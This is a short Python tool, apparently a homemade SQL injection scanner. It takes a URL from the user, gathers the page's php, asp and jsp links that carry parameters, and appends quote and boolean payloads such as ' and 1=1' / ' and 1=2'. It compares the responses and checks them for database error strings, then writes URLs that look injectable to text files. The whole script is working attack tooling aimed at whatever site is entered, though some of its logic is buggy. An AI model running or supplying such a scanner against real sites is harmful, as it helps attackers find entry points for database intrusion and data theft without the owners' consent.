import requests,re,time,os
from tqdm import tqdm
from bs4 import BeautifulSoup
def zhuru():
    global x,headers,ps
    user=input('[+]Please enter the URL you want to test:')
    url="{}".format(user.strip())
    headers={'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36'}
    request=requests.get(url,headers)
    shoujiurl=[]
    rse=request.content
    gwd=BeautifulSoup(rse,'html.parser')
    php=gwd.find_all(href=re.compile(r'php\?'))
    asp=gwd.find_all(href=re.compile(r'asp\?'))
    jsp=gwd.find_all(href=re.compile(r'jsp\?'))
    print('[+]Collection URL ')
    for i in tqdm(range(1,500)):
        time.sleep(0.001)
    for lk in php:
        basd=lk.get('href')
        shoujiurl.append(basd)
    for ba in asp:
        basd2=ba.get('href')
        shoujiurl.append(basd2)
    for op in jsp:
        basd3=op.get('href')
        shoujiurl.append(basd3)
    print('[+]Collection completed')


    huixian=[]
    huixian1 = "is not a valid MySQL result resource"
    huixian2 = "ODBC SQL Server Driver"
    huixian3 = "Warning:ociexecute"
    huixian4 = "Warning: pq_query[function.pg-query]"
    huixian5 = "You have an error in your SQL syntax"
    huixian6 = "Database Engine"
    huixian7 = "Undefined variable"
    huixian8 = "on line"
    huixian9 = "mysql_fetch_array():"

    huixian.append(huixian1)
    huixian.append(huixian2)
    huixian.append(huixian3)
    huixian.append(huixian4)
    huixian.append(huixian5)
    huixian.append(huixian6)
    huixian.append(huixian7)
    huixian.append(huixian8)
    huixian.append(huixian9)
    for g in huixian:
        ps="".join(g)

    payload0="'"
    payload1="''"
    payload2="%20and%201=1"
    payload3="%20and%201=2"
    for x in shoujiurl:
        yuan="".join(x)
        ssdx="".join(x)+payload0
        ssdx2="".join(x)+payload1
        ssdx3="".join(x)+payload2
        ssdx4="".join(x)+payload3
        pdul=re.findall('[a-zA-z]+://[^\s]*',ssdx)
        pdul2=re.findall('[a-zA-z]+://[^\s]*',ssdx2)
        pdul3=re.findall('[a-zA-z]+://[^\s]*',yuan)
        pdul4=re.findall('[a-zA-z]+://[^\s]*',ssdx3)
        pdul5=re.findall('[a-zA-z]+://[^\s]*',ssdx4)
        psuw="".join(pdul)
        psuw2="".join(pdul2)
        psuw3="".join(pdul3)
        psuw4="".join(pdul4)
        psuw5="".join(pdul5)
        try:
            resg=requests.get(url=psuw,headers=headers,timeout=6)
            resg2=requests.get(url=psuw2,headers=headers,timeout=6)
            resg3=requests.get(url=psuw3,headers=headers,timeout=6)
            resg4=requests.get(url=psuw4,headers=headers,timeout=6)
            resg5=requests.get(url=psuw5,headers=headers,timeout=6)
            if resg.status_code == 200:
                print('[+]The first step is completed, and the goal is to be stable')
                time.sleep(1)
                if resg.content != resg2.content and resg3.content == resg2.content:
                    print('[+]Existence of character injection')
                    print(resg3.url)
                    print(resg3.url,file=open('character.txt','a'))
                elif resg4.content != resg5.content and resg4.content == resg3.content:
                    print('[+]Digital injection')
                    print(resg3.url)
                    print(resg3.url,file=open('injection.txt','a'))

                else:
                    print('[+]Sorry, not character injection')
                    print('[+]Sorry, not Digital injection')
                    print(resg3.url)
                if ps in str(resg2.content):
                    print('[+]The wrong sentence to be found',ps)
            elif resg.status_code != 200:
                print('http_stode:',resg.status_code)
                print('[-]Sorry, I cant tell if there is an injection')
        except:
          pass


zhuru()
